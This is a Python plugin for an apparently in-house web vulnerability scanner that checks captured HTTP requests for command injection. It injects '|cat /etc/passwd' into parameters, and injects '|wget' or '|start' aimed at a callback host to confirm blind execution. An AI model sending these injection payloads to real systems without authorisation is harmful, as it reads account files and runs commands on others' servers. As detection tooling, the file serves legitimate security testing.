#!/ usr/bin/env
# coding=utf-8
#
# Copyright 2019 ztosec & https://www.zto.com/
#
# Licensed under the Apache License, Version 2.0 (the "License"); you may
# not use this file except in compliance with the License. You may obtain
# a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
# License for the specific language governing permissions and limitations
# under the License.
"""
author: b5mali4
"""
import ssl
import json
import urllib3

urllib3.disable_warnings()
import requests
from common import http_util
from common.http_util import HttpMethod
from plugins.base.vuln_enum import VulnType
from plugins.base.base_checker import BaseChecker
from parser.base_traffic_parser import BaseTrafficParser
from parser.chrome_traffic_parser import ChromeTrafficParser
from model.system_config import SystemConfig, SystemConfigService
from common.plugins_util import get_plugin_uuid


class Checker(BaseChecker):
    def check_logic(self, request_raw):

        """
        判断能否查看passwd或者执行wget命令
        :param request_raw: 
        :return: 
        """
        http_method = str(request_raw["method"]).lower()
        temp_url = str(request_raw["url"]).strip()
        temp_headers = http_util.header_to_lowercase(json.loads(request_raw['headers']))
        content_type = temp_headers[
            "content-type"] if temp_headers is not None and http_util.ContentType.NAME.lower() in temp_headers else None
        temp_data = request_raw['data'] if "data" in request_raw else None

        self.check_passwd(request_raw, http_method, temp_url, temp_headers, content_type, temp_data)
        if self.result["status"]:
            return

        self.wget_linux(request_raw, http_method, temp_url, temp_headers, content_type, temp_data)
        if self.result["status"]:
            return

        self.start_windows(request_raw, http_method, temp_url, temp_headers, content_type, temp_data)
        if self.result["status"]:
            return

    def check_passwd(self, request_raw, http_method, temp_url, temp_headers, content_type, temp_data):
        """
        检查 /etc/passwd
        :return: 
        """
        req = None
        # 情况1 和情况2
        try:
            payload = self.get_parser_class(request_raw).add_poc_data(url=temp_url, data=temp_data,
                                                                      http_method=http_method,
                                                                      content_type=content_type, poc="|cat /etc/passwd")
            req = requests.request(method=payload["http_method"], url=payload["url"], data=payload["data"],
                                   headers=temp_headers, timeout=5, verify=False)
        except Exception:
            pass

        if req:
            res_content = req.content.decode("utf-8")
            if res_content and "root:" in res_content and "daemon:" in res_content:
                self.result['status'] = True
                self.result['info'] = '%s 存在一个命令执行漏洞' % temp_url
                self.result['payload'] = payload

    def wget_linux(self, request_raw, http_method, temp_url, temp_headers, content_type, temp_data, cmd="|wget"):
        """
        linux上执行的wget代码，针对无回显，自动选择DNS或者是SOCKET
        :return: 
        """
        blind_poc, check_bilnd_poc_url, hunter_log_api_token = self.generate_blind_poc()

        if not blind_poc["data"]:
            return

        if blind_poc["type"] == "dns":
            attack_payload = "http://%s" % (blind_poc["data"])  # 得到的是一个域名，域名前缀为uuid
        elif blind_poc["type"] == "socket":
            attack_payload = "http://%s:%s/%s" % (
            blind_poc["data"]["host"], blind_poc["data"]["port"], blind_poc["data"]["uuid"])

        try:
            payload = self.get_parser_class(request_raw).add_poc_data(url=temp_url, data=temp_data,
                                                                      http_method=http_method,
                                                                      content_type=content_type,
                                                                      poc="%s %s" % (cmd, attack_payload))
            req = requests.request(method=payload["http_method"], url=payload["url"], data=payload["data"],
                                   headers=temp_headers, timeout=5, verify=False)
        except Exception:
            pass

        req = requests.get(check_bilnd_poc_url, headers={"token": hunter_log_api_token}, timeout=5)
        if req:
            response = req.json()
            if "status" in response and response["status"] == 200:
                self.result['status'] = True
                self.result['info'] = '%s 存在一个命令执行漏洞' % request_raw['url']
                self.result['payload'] = payload

    def start_windows(self, request_raw, http_method, temp_url, temp_headers, content_type, temp_data):
        """
        windows上执行start代码，和上面一样，唯一不同的是将wget替换成start
        :return: 
        """
        self.wget_linux(request_raw, http_method, temp_url, temp_headers, content_type, temp_data, "|start")

    def init_plugin_info(self):
        """
        插件信息
        :return: 
        """
        tag = "owasp"
        name = "cmd_exec"
        imp_version = "所有版本"
        description = "由于过滤不当，导致可以通过控制参数执行命令,参考链接http://wiki.dev.ztosys.com/pages/viewpage.action?pageId=25270159"
        repair = "过滤参数"
        type = VulnType.CMD_ECT
        author = "b5mali4"
        temp_info = {"repair": repair, "name": name, "type": type, "description": description,
                     "imp_version": imp_version, "author": author, "tag": tag}
        self.info = dict(self.info, **temp_info)
